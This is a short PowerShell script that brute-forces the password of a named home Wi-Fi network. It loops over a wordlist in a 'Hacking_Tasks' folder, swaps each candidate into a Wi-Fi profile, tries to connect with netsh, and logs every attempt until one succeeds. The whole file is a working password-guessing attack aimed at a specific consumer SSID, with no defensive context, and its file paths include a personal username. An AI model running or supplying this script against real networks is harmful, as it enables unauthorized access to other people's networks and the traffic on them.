# Tests passwords and saves results to Results/test-results.txt
$ssid = "DStv_Internet_2.4G_9E6450"
$template = Get-Content "$env:TEMP\Wi-Fi-LabWiFi.xml" -Raw
$passwords = Get-Content "C:\Users\ChalasiMbira\Documents\Hacking_Tasks\passwords.txt"
$resultsPath = "C:\Users\ChalasiMbira\Documents\Hacking_Tasks\Results\test-results.txt"

"Starting Wi-Fi password test for $ssid" | Out-File -FilePath $resultsPath
foreach ($pass in $passwords) {
    $profile = $template -replace "PASSWORDHERE", $pass
    $profile | Out-File "$env:TEMP\temp-profile.xml"
    netsh wlan add profile filename="$env:TEMP\temp-profile.xml"
    netsh wlan connect name=$ssid
    Start-Sleep -Seconds 5
    $status = (netsh wlan show interfaces) | Select-String "State\s+:\s+(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value }
    "Tried password: $pass - Status: $status" | Out-File -FilePath $resultsPath -Append
    if ($status -eq "connected") {
        "Success! Password is: $pass" | Out-File -FilePath $resultsPath -Append
        Write-Host "Success! Password is: $pass"
        break
    }
    netsh wlan delete profile name=$ssid
}
Remove-Item "$env:TEMP\temp-profile.xml"
Write-Host "Test results saved to $resultsPath"